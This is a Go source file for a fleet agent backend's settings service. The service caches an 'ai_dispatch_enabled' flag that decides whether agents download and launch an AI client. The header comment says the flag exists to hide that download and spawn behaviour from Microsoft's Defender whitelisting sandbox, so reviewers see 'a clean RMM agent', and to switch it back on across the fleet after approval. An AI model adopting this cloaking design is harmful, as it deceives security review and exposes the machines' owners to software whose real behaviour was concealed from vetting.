package services

import (
	"context"
	"encoding/json"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"

	"github.com/worktrack/backend/internal/database"
)

// SystemSettingsService manages global on/off flags that gate
// fleet-wide behaviour. The first and currently only flag is
// `ai_dispatch_enabled` — when false, the heartbeat handler skips
// embedding the active AI package URL and never sets launch_ai=true,
// so agents will not download or spawn the AI client.
//
// Why this exists: while submitting Smartcore.exe + setup.exe to the
// Microsoft Defender Submission Portal for whitelist consideration,
// Microsoft examines the binaries in a sandbox. We don't want them
// to observe the AI bundle being fetched, extracted, and spawned —
// that surface area belongs to us, not in their telemetry. With the
// flag off, the agent boots, heartbeats, and does nothing more.
// Microsoft sees a clean RMM agent. Once approved, we flip the flag
// back to true and the fleet picks up AI on the next heartbeat.
//
// Reads are cached in-process for HOT_CACHE_TTL because the heartbeat
// handler hits this on every single agent heartbeat (≈30 RPS for a
// 2000-machine fleet at 60s cadence). A few seconds of staleness on
// a setting change is fine — the dashboard toggle propagates within
// HOT_CACHE_TTL plus one heartbeat cycle in the worst case.
type SystemSettingsService struct {
	db *database.DB

	// Cached AI dispatch flag. Atomic int32 so heartbeat reads are
	// lock-free. 1 = enabled, 0 = disabled, 2 = unknown (forces
	// reload on next read).
	aiDispatchCached atomic.Int32
	cacheLoadedAt    atomic.Int64 // unix nano

	loadMu sync.Mutex // serialises DB refreshes
}

// hotCacheTTL is how long an in-process cached value is trusted
// before the next read re-queries Postgres. Trade-off:
//
//	too short  → DB pressure under heartbeat fan-out
//	too long   → admin toggle takes too long to propagate
//
// 5 seconds is well within the heartbeat cycle (60s) so the toggle
// reaches every machine within ~1 minute regardless. Flip the flag,
// every heartbeat in the next 60s sees the new value.
const hotCacheTTL = 5 * time.Second

// keyAIDispatchEnabled is the canonical settings.key for the AI
// kill-switch. JSONB value is a single bool: true | false.
const keyAIDispatchEnabled = "ai_dispatch_enabled"

func NewSystemSettingsService(db *database.DB) *SystemSettingsService {
	s := &SystemSettingsService{db: db}
	// 2 = unknown, forces first read to populate cache.
	s.aiDispatchCached.Store(2)
	return s
}

// AIDispatchEnabled returns whether the heartbeat handler should embed
// AI metadata + launch_ai signals. Hot path — called on every agent
// heartbeat. Reads from in-process cache; refreshes from DB on miss
// or when the cache TTL has expired. On any DB error we fail-safe to
// TRUE (dispatch enabled) so a transient Postgres hiccup doesn't
// blackhole the entire fleet's AI flow.
func (s *SystemSettingsService) AIDispatchEnabled(ctx context.Context) bool {
	loadedAt := s.cacheLoadedAt.Load()
	cached := s.aiDispatchCached.Load()
	now := time.Now().UnixNano()

	// Fast path: cache is fresh and populated.
	if cached != 2 && now-loadedAt < int64(hotCacheTTL) {
		return cached == 1
	}

	// Slow path: refresh from DB. Serialise to avoid thundering herd.
	s.loadMu.Lock()
	defer s.loadMu.Unlock()

	// Re-check in case another goroutine already refreshed.
	loadedAt = s.cacheLoadedAt.Load()
	cached = s.aiDispatchCached.Load()
	if cached != 2 && time.Now().UnixNano()-loadedAt < int64(hotCacheTTL) {
		return cached == 1
	}

	enabled, err := s.readBool(ctx, keyAIDispatchEnabled)
	if err != nil {
		// Fail-safe: dispatch enabled. A DB outage shouldn't kill AI
		// rollout for the whole fleet.
		return true
	}
	if enabled {
		s.aiDispatchCached.Store(1)
	} else {
		s.aiDispatchCached.Store(0)
	}
	s.cacheLoadedAt.Store(time.Now().UnixNano())
	return enabled
}

// SetAIDispatchEnabled persists a new flag value and invalidates the
// in-process cache so the next heartbeat re-reads. Idempotent — the
// SQL is an upsert.
func (s *SystemSettingsService) SetAIDispatchEnabled(ctx context.Context, enabled bool, by uuid.UUID) error {
	if err := s.writeBool(ctx, keyAIDispatchEnabled, enabled, by); err != nil {
		return err
	}
	if enabled {
		s.aiDispatchCached.Store(1)
	} else {
		s.aiDispatchCached.Store(0)
	}
	s.cacheLoadedAt.Store(time.Now().UnixNano())
	return nil
}

// SettingsSnapshot is the shape returned to the admin dashboard so
// the toggle UI can render the current state + who flipped it last.
type SettingsSnapshot struct {
	AIDispatchEnabled bool       `json:"ai_dispatch_enabled"`
	UpdatedAt         time.Time  `json:"updated_at"`
	UpdatedBy         *uuid.UUID `json:"updated_by,omitempty"`
}

// Snapshot returns the current state of every flag known to the
// dashboard. Bypasses the hot cache because the dashboard call is
// rare (once per page load, not per heartbeat) and we want to show
// the freshest possible value to the admin.
func (s *SystemSettingsService) Snapshot(ctx context.Context) (SettingsSnapshot, error) {
	var (
		raw        []byte
		updatedAt  time.Time
		updatedBy  *uuid.UUID
		dispatchOn = true
	)
	err := s.db.Pool.QueryRow(ctx, `
		SELECT value, updated_at, updated_by
		FROM system_settings
		WHERE key = $1
	`, keyAIDispatchEnabled).Scan(&raw, &updatedAt, &updatedBy)
	if err == nil {
		if jerr := json.Unmarshal(raw, &dispatchOn); jerr != nil {
			return SettingsSnapshot{}, fmt.Errorf("decode ai_dispatch_enabled: %w", jerr)
		}
	} else {
		// Row missing — treat as default-on, no admin attribution.
		dispatchOn = true
	}
	return SettingsSnapshot{
		AIDispatchEnabled: dispatchOn,
		UpdatedAt:         updatedAt,
		UpdatedBy:         updatedBy,
	}, nil
}

// readBool fetches a single boolean-shaped JSONB value. Missing rows
// default to TRUE (enabled) so a brand-new install with no seed row
// still operates normally.
func (s *SystemSettingsService) readBool(ctx context.Context, key string) (bool, error) {
	var raw []byte
	err := s.db.Pool.QueryRow(ctx, `SELECT value FROM system_settings WHERE key = $1`, key).Scan(&raw)
	if err != nil {
		// pgx returns ErrNoRows on a 0-row result; treat as default-on.
		// Other errors propagate up so the caller can fail-safe.
		if err.Error() == "no rows in result set" {
			return true, nil
		}
		return false, err
	}
	var v bool
	if jerr := json.Unmarshal(raw, &v); jerr != nil {
		return false, fmt.Errorf("decode %s: %w", key, jerr)
	}
	return v, nil
}

// writeBool upserts a boolean flag and stamps the actor + timestamp.
func (s *SystemSettingsService) writeBool(ctx context.Context, key string, v bool, by uuid.UUID) error {
	raw, err := json.Marshal(v)
	if err != nil {
		return err
	}
	_, err = s.db.Pool.Exec(ctx, `
		INSERT INTO system_settings (key, value, updated_at, updated_by)
		VALUES ($1, $2::jsonb, now(), $3)
		ON CONFLICT (key) DO UPDATE
		   SET value = EXCLUDED.value,
		       updated_at = now(),
		       updated_by = EXCLUDED.updated_by
	`, key, raw, by)
	return err
}
